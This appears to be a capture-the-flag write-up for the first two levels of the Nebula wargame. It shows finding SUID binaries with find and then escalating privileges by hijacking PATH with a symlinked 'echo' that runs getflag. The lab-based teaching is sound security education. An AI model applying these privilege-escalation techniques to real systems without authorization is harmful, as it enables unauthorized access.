### Level00

The first level is about finding a program with setuid bit set. Upon googling, I found that there is a find command option which can be used to find files with speficic permission bits. 

`find / -perm 4000` gives all files or directories with SUID bit in root directory. After running it and going through results, /bin/.../flag00 seems interesting. When we run the binary, it is run as `flag00` user due to the SUID bit. 

```
flag00@nebula:/bin/...$ ls -al
total 8
drwxr-xr-x 2 root   root      29 2011-11-20 21:22 .
drwxr-xr-x 3 root   root    2728 2012-08-18 02:50 ..
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 flag00

level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!

flag00@nebula:~$ getflag

### Level01

After looking at the source code of this binary, I remembered a similar challenge from a software security course during my grad school. 
The *gid_t* and *uid_t* are actually aliases for `unsigned int` data type.  `getegid()` and `geteuid()` get the effective groupID and effective userID of the process which is `flag01` because the SUID bit is set. Then the real ,effective and and saved userID of current process is changed to `flag01` and the echo command is run. 

Whenever Linux executes a command, it searches the directories specified in PATH environment variable for the corresponding binary. Here, to complete the challenge, we need to execute `/bin/getflag` as the user `flag01`. The first step is to alter the PATH variable so that Linux will search for our folder (/home/level01) first.   

```
export PATH=/home/level01:$PATH

level01@nebula:~$ echo $PATH
/home/level01:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Then we create a file called as echo in the `/home/level01` directory,  which is a symbolic link to the `/bin/getflag` binary. 

```
level01@nebula:~$ ln -s /bin/getflag echo

level01@nebula:~$ file echo 
echo: symbolic link to `/bin/getflag'

level01@nebula:~$ /home/flag01/flag01
You have successfully executed getflag on a target account

```
